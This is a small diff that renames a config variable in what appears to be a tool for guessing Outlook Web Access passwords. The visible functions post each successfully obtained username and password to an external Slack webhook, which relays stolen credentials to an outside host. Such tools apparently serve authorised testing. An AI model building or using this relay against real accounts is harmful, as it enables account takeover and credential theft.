@@ -6,7 +6,7 @@ from datetime import datetime
 
 # We can set anything up here for easy parsing and access later, for the moment this only houses the slack webhook, can probably add discord and other platforms at a later date as parsing isn't an issue.
 
-configvars = read_json("config-vars")
+config_dict = read_json("config-vars")
 
 def generate_ip():
 
@@ -59,7 +59,7 @@ def get_owa_domain(url, uri, useragent):
 # Function for posting username/password to slack channel
 def slacknotify(username, password):
     now = datetime.now()
-    webhook_url = configvars["slack_webhook"]
+    webhook_url = config_dict["slack_webhook"]
     message = {"text": '```[Valid Credentials Obtained!]\nUser: ' + username + '\nPass: ' + password + '\nDate: ' + now.strftime("%d-%m-%Y") + '\nTime: ' + now.strftime("%H:%M:%S") + '```'}
     response = requests.post(
         webhook_url, data=json.dumps(message),
@@ -69,7 +69,7 @@ def slacknotify(username, password):
 # Function for debug messages 
 def slacklog(slacklog_msg):
     now = datetime.now()
-    webhook_url = configvars["slack_webhook"]
+    webhook_url = config_dict["slack_webhook"]
     message = {"text": '```[Log Entry]\n' + slacklog_msg + '\nDate: ' + now.strftime("%d-%m-%Y") + '\nTime: ' + now.strftime("%H:%M:%S") + '```'}
     response = requests.post(
         webhook_url, data=json.dumps(message),
